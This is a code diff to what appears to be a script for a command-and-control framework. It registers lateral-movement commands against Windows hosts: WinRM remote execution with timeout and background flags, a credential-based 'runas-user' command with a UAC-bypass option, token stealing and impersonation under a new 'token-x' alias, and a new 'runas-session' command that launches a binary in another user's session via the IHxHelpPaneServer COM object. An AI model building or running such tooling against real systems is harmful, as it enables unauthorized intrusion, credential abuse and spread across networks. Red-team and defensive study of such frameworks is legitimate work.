@@ -67,14 +67,18 @@ cmd_jump.addSubCommands([_cmd_jump_psexec, _cmd_jump_scshell]);
 
 
 
-var _cmd_invoke_winrm = ax.create_command("winrm", "Use WinRM to execute commands on other systems", "invoke winrm 192.168.0.1 whoami /all");
+var _cmd_invoke_winrm = ax.create_command("winrm", "Use WinRM to execute commands on other systems", "invoke winrm 192.168.0.1 \"whoami /all\" -t 60000");
 _cmd_invoke_winrm.addArgString("target", true);
 _cmd_invoke_winrm.addArgString("cmd", true);
+_cmd_invoke_winrm.addArgFlagInt("-t", "timeout", "Timeout in milliseconds to wait for output (0 = infinite)", 0);
+_cmd_invoke_winrm.addArgBool("-b", "background", "Keep WinRM shell open for background execution, no output");
 _cmd_invoke_winrm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let target = parsed_json["target"];
     let cmd = parsed_json["cmd"];
+    let timeout = parsed_json["timeout"];
+    let background = parsed_json["-b"] ? 1 : 0;
 
-    let bof_params = ax.bof_pack("wstr,wstr", [target, cmd]);
+    let bof_params = ax.bof_pack("wstr,wstr,int,int", [target, cmd, timeout, background]);
     let bof_path = ax.script_dir() + "_bin/winrm." + ax.arch(id) + ".o";
     let message = `Task: Invoke to ${target} via WinRM`;
 
@@ -153,18 +157,21 @@ _cmd_token_steal.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
 var cmd_token = ax.create_command("token", "Impersonate token");
 cmd_token.addSubCommands([_cmd_token_make, _cmd_token_steal]);
 
+var cmd_token_x = ax.create_command("token-x", "Impersonate token");
+cmd_token_x.addSubCommands([_cmd_token_make, _cmd_token_steal]);
 
 
-var cmd_runas = ax.create_command("runas", "Run a command as another user using explicit credentials (RunasCs-like)", "runas admin P@ssword domain.local \"cmd /c whoami\" -l 9 -t 30000 -o -b");
-cmd_runas.addArgString("username", true, "Username for authentication");
-cmd_runas.addArgString("password", true, "Password for authentication");
-cmd_runas.addArgString("domain", true, "Domain (use '.' for local)");
-cmd_runas.addArgString("command", true, "Command line to execute");
-cmd_runas.addArgFlagInt("-l", "logon_type", "Logon type: 2-Interactive, 3-Network, 4-Batch, 5-Service, 8-NetworkCleartext, 9-NewCredentials", 2);
-cmd_runas.addArgFlagInt("-t", "timeout", "Timeout in milliseconds to wait for process output (default: 120000)", 0);
-cmd_runas.addArgBool("-o", "With output capture");
-cmd_runas.addArgBool("-b", "Bypass UAC (use with admin credentials)");
-cmd_runas.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+
+var cmd_runas_user = ax.create_command("runas-user", "Run a command as another user using explicit credentials (RunasCs-like)", "runas admin P@ssword domain.local \"cmd /c whoami\" -l 9 -t 30000 -o -b");
+cmd_runas_user.addArgString("username", true, "Username for authentication");
+cmd_runas_user.addArgString("password", true, "Password for authentication");
+cmd_runas_user.addArgString("domain", true, "Domain (use '.' for local)");
+cmd_runas_user.addArgString("command", true, "Command line to execute");
+cmd_runas_user.addArgFlagInt("-l", "logon_type", "Logon type: 2-Interactive, 3-Network, 4-Batch, 5-Service, 8-NetworkCleartext, 9-NewCredentials", 2);
+cmd_runas_user.addArgFlagInt("-t", "timeout", "Timeout in milliseconds to wait for process output (default: 120000)", 0);
+cmd_runas_user.addArgBool("-o", "With output capture");
+cmd_runas_user.addArgBool("-b", "Bypass UAC (use with admin credentials)");
+cmd_runas_user.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let username   = parsed_json["username"];
     let password   = parsed_json["password"];
     let domain     = parsed_json["domain"];
@@ -183,12 +190,36 @@ cmd_runas.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var group_test = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_invoke, cmd_token, cmd_runas]);
-ax.register_commands_group(group_test, ["beacon", "gopher"], ["windows"], []);
+
+var cmd_runas_session = ax.create_command("runas-session", "Execute binary in another user's session via IHxHelpPaneServer COM", "runas-session 3 C:\\Windows\\Temp\\file.exe");
+cmd_runas_session.addArgInt("session_id", true);
+cmd_runas_session.addArgString("filepath", true);
+cmd_runas_session.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let sessId = parsed_json["session_id"];
+    let path   = parsed_json["filepath"];
+
+    if( ax.is64(id) == false ) { throw new Error("WoW64 is not supported"); }
+
+    if( ax.isadmin(id) == false ) { throw new Error("You need to be admin to run nanodump"); }
+
+    let bof_params = ax.bof_pack("int,wstr", [sessId, path]);
+    let bof_path = ax.script_dir() + "_bin/runas_sess_ihxexec." + ax.arch(id) + ".o";
+    let message = `Task: Cross-Sessions executeion ${path}`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
 
 
 
-/// MENU PROCESS
+var group_lateral = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_invoke, cmd_token, cmd_runas_user, cmd_runas_session]);
+ax.register_commands_group(group_lateral, ["beacon", "gopher"], ["windows"], []);
+
+var group_lateral_x = ax.create_commands_group("LateralMovement-BOF-X", [cmd_jump, cmd_invoke, cmd_token_x, cmd_runas_user, cmd_runas_session]);
+ax.register_commands_group(group_lateral_x, ["kharon"], ["windows"], []);
+
+
+
+/// MENU
 
 let token_steal_action = menu.create_action("Steal token", function(process_list) {
     if (process_list.length > 0 ) {
